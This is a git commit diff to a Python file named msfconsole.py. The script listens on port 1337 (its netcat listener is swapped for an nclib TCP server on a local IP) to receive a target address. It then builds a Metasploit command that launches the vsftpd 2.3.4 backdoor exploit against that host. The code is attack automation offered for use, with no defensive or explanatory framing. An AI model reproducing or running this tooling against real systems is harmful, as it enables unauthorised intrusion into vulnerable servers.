4b13e6ac2606387e3a869c1084cfe14b0e636c60
peytonrayne <51815710+peytonrayne@users.noreply.github.com>
2021-07-06 20:02:17 -0400

    Update msfconsole.py
    it works

--- msfconsole.py
+++ msfconsole.py
@@ -1,10 +1,16 @@
+#!/usr/bin/env python3
+from nclib import TCPServer
 import subprocess
 
 def listener():
 
-	target = subprocess.run(["nc", "-lp", "1337"])
-	target = target[1]
-	return target
+	server = TCPServer(("192.168.56.108", 1337))
+	for client in server:
+		target = client.recv()
+		target = str(target.rstrip())
+		target = target[1:]
+		print(target)
+		return target
 
 def generate(target):
 	exploit = "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost "+target+"; run"
